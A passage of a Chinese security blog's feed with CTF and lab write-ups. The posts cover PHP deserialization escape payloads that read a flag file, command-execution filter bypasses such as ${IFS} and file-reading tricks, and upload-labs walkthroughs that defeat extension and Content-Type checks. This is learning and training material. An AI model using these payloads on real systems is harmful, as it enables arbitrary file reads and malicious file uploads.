class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方法和上面的demo2类似，这里就不再重复了，原理就是利用过滤为空让反序列化会自动往后读取，然后可以对<code>$_SESSION[&#39;img&#39;]</code>进行控制，进而可以任意文件读取</p><p>payload：</p><p>读取hint提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=fl1gfl1gfl1gfl1gfl1gfl1g&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"L2QwZzNfZmxsbGxsbGFn"</span>;s:<span class="number">3</span>:<span class="string">"aaa"</span>;s:<span class="number">2</span>:<span class="string">"no"</span>;&#125;&amp;<span class="function"><span class="keyword">function</span>=<span class="title">show_image</span></span></span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://www.cnblogs.com/wfzWebSecuity/p/11876441.html" target="_blank" rel="noopener">PHP字符逃逸导致的对象注入</a></li><li><a href="https://www.cnblogs.com/peri0d/p/11845917.html" target="_blank" rel="noopener">详解PHP反序列化中的字符逃逸</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php反序列化中的对象逃逸的学习&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php中escapeshellarg和escapeshellcmd的绕过</title>
    <link href="http://0clickjacking0.github.io/2019/12/13/php%E4%B8%ADescapeshellarg%E5%92%8Cescapeshellcmd%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <id>http://0clickjacking0.github.io/2019/12/13/php中escapeshellarg和escapeshellcmd的绕过/</id>
    <published>2019-12-13T12:03:44.000Z</published>
    <updated>2019-12-13T13:04:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>php中escapeshellarg和escapeshellcmd的绕过的学习</p><a id="more"></a><h1 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php中escapeshellarg和escapeshellcmd的绕过的学习&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>命令执行bypass的总结</title>
    <link href="http://0clickjacking0.github.io/2019/12/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cbypass%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2019/12/11/命令执行bypass的总结/</id>
    <published>2019-12-11T02:17:37.000Z</published>
    <updated>2020-01-12T11:24:08.436Z</updated>
    
    <content type="html"><![CDATA[<p>命令执行bypass的总结</p><a id="more"></a><h1 id="关于文件读取的命令"><a href="#关于文件读取的命令" class="headerlink" title="关于文件读取的命令"></a>关于文件读取的命令</h1><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p><strong>cat命令</strong>连接文件并打印到标准输出设备上，cat经常用来显示文件的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h2><p><strong>tac命令</strong>用于将文件已行为单位的反序输出，即第一行最后显示，最后一行先显示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tac 1.txt</span></span><br><span class="line">666</span><br><span class="line">555</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p><strong>head命令</strong>用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># head 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p><strong>tail命令</strong>用于输入文件中的尾部内容。tail命令默认在屏幕上显示指定文件的末尾10行。如果给定的文件不止一个，则在显示的每个文件前面加一个文件名标题。如果没有指定文件或者文件名为“-”，则读取标准输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># tail 1.txt 2.txt</span></span><br><span class="line">==&gt; 1.txt &lt;==</span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br><span class="line"></span><br><span class="line">==&gt; 2.txt &lt;==</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br></pre></td></tr></table></figure><h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p><strong>more命令</strong>是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># more 1.txt</span></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="less-在docker中可能不存在这个命令"><a href="#less-在docker中可能不存在这个命令" class="headerlink" title="less(在docker中可能不存在这个命令)"></a>less(在docker中可能不存在这个命令)</h2><p><strong>less命令</strong>的作用与<a href="http://man.linuxde.net/more" target="_blank" rel="noopener">more</a>十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。用less命令显示文件时，用PageUp键向上翻页，用PageDown键向下翻页。要退出less程序，应按Q键。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">less 1.txt</span><br><span class="line"></span><br><span class="line">123456</span><br><span class="line">555</span><br><span class="line">666</span><br></pre></td></tr></table></figure><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p><strong>nl命令</strong>读取 <a href="http://man.linuxde.net/file" target="_blank" rel="noopener">file</a> 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。在输出中，nl命令根据您在命令行中指定的标志来计算左边的行。输入文本必须写在逻辑页中。每个逻辑页有头、主体和页脚节（可以有空节）。除非使用<code>-p</code>选项，nl 命令在每个逻辑页开始的地方重新设置行号。可以单独为头、主体和页脚节设置行计算标志（例如，头和页脚行可以被计算然而文本行不能）。其默认的结果与<code>cat -n</code>有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐0等等的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># nl 1.txt</span></span><br><span class="line">     1123456</span><br><span class="line">     2555</span><br><span class="line">     3666</span><br></pre></td></tr></table></figure><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>从指定的文件file中读取数据，编码为base64字符串输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base64 1.txt</span></span><br><span class="line">MTIzNDU2CjU1NQo2NjYK</span><br></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>从指定的文件file中读取数据，编码为base32字符串输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># base32 1.txt</span></span><br><span class="line">GEZDGNBVGYFDKNJVBI3DMNQK</span><br></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p><strong>strings命令</strong>在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># strings 1.txt</span></span><br><span class="line">123456</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p><strong>sort命令</strong>是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9423a7551563:/<span class="comment"># sort 1.txt</span></span><br><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><p>每行都倒序输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ rev 1.php</span><br><span class="line">.atad fo setyb )48(65 )1.0.0.721( 1.0.0.721 GNIP</span><br><span class="line">sm 340.0=emit 46=ltt 1=qes_pmci :1.0.0.721 morf setyb 46</span><br><span class="line">sm 140.0=emit 46=ltt 2=qes_pmci :1.0.0.721 morf setyb 46</span><br></pre></td></tr></table></figure><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p><strong>od命令</strong>用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># od 1.txt</span></span><br><span class="line">0000000 031061 032063 033065 032412 032465 033012 033066 000012</span><br><span class="line">0000017</span><br></pre></td></tr></table></figure><h2 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h2><p><strong>cut命令</strong>用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容，类似于下的<a href="http://man.linuxde.net/type" target="_blank" rel="noopener">type</a>命令。</p><h3 id="cut选项说明："><a href="#cut选项说明：" class="headerlink" title="cut选项说明："></a>cut选项说明：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">选项-b，以字节为单位进行分割，-b支持形如3-5的写法，而且多个定位之间用逗号隔开就成了,比如想提取第3，第4、第5和第8个字节，命令为 -b 3-5,8</span><br><span class="line"></span><br><span class="line">选项-c，以字符为单位进行分割。用法与-b类似</span><br><span class="line"></span><br><span class="line">选项-f，后面跟列号，比如-f 1，表示读取第一列的信息</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cut -b 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -f 1 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br><span class="line"></span><br><span class="line">root@c6017a98836f:/var<span class="comment"># cut -c 1-30 /flag</span></span><br><span class="line">huctf&#123;put_1s_a_900d_wa7&#125;</span><br></pre></td></tr></table></figure><h2 id="hexdump-在docker中可能不存在这个命令"><a href="#hexdump-在docker中可能不存在这个命令" class="headerlink" title="hexdump(在docker中可能不存在这个命令)"></a>hexdump(在docker中可能不存在这个命令)</h2><p><strong>hexdump命令</strong>一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ hexdump 1.txt</span><br><span class="line">0000000 6568 6c6c 206f 6978 6e61 7579 3231 2133</span><br><span class="line">0000010 000a</span><br><span class="line">0000011</span><br></pre></td></tr></table></figure><h2 id="xxd-在docker中可能不存在这个命令"><a href="#xxd-在docker中可能不存在这个命令" class="headerlink" title="xxd(在docker中可能不存在这个命令)"></a>xxd(在docker中可能不存在这个命令)</h2><p><strong>xxd能将一个给定文件或标准输入转换为十六进制形式，也能将十六进制转换回二进制形式。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ xxd 1.txt</span><br><span class="line">00000000: 6865 6c6c 6f20 7869 616e 7975 3132 3321  hello xianyu123!</span><br><span class="line">00000010: 0a</span><br></pre></td></tr></table></figure><h1 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h1><h2 id="方法1：-IFS"><a href="#方法1：-IFS" class="headerlink" title="方法1：${IFS}"></a>方法1：${IFS}</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$&#123;IFS&#125;</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p>payload3:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-16-ubuntu:~$ ls<span class="variable">$IFS</span><span class="variable">$9</span>/home</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><h2 id="方法2：重定向符-lt-gt"><a href="#方法2：重定向符-lt-gt" class="headerlink" title="方法2：重定向符&lt;&gt;"></a>方法2：重定向符&lt;&gt;</h2><p>payload1:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;&gt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@c6017a98836f:/var<span class="comment"># cat&lt;1.txt</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;命令执行bypass的总结&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Upload-labs解题笔记</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/Upload-labs%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/Upload-labs解题笔记/</id>
    <published>2019-11-27T11:56:44.000Z</published>
    <updated>2020-05-11T08:41:14.841Z</updated>
    
    <content type="html"><![CDATA[<p>upload-labs解题记录</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查看源码，我们得知这里只是进行了前端的检测，所以我们先上传一个后缀名为gif的文件，然后抓包，在burp中把gif改成php，然后就可以直接绕过了</p><p><img src="http://images.xianyu123.club/up_pass1_1.png" alt></p><p><img src="http://images.xianyu123.club/up_pass1_2.png" alt></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查看源码，我们发现这里只是检测了http header字段中的<code>Content-Type</code>字段，并没有对后缀名进行检测，所以上传后缀名为php的文件即可</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>.asp,.aspx,.php,.jsp</code>后缀的文件</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span 